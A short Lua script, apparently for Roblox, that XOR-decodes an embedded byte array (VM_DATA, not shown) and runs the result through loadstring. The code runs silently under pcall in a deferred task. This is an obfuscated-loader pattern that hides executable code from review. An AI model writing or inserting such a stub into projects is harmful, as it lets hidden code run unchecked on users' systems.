local function runVM()

    local function bxor(a,b)
        local r, bit = 0, 1
        while a > 0 or b > 0 do
            if (a % 2) ~= (b % 2) then r = r + bit end
            a = math.floor(a / 2)
            b = math.floor(b / 2)
            bit = bit * 2
        end
        return r
    end

    local function clamp(n)
        n = n % 256
        if n < 0 then n = n + 256 end
        return n
    end

    local key = 123
    local buf = {}

    for i = 1, #VM_DATA do
        local byte = VM_DATA[i]

        local k = bxor(key, i % 256)
        local dec = bxor(byte, k)

        buf[#buf+1] = string.char(clamp(dec))
    end

    local src = table.concat(buf)

    local f = loadstring(src)
    if f then
        task.spawn(function()
            pcall(f)
        end)
    else
        warn("VM decode failed (no loadstring)")
    end
end

task.defer(runVM)

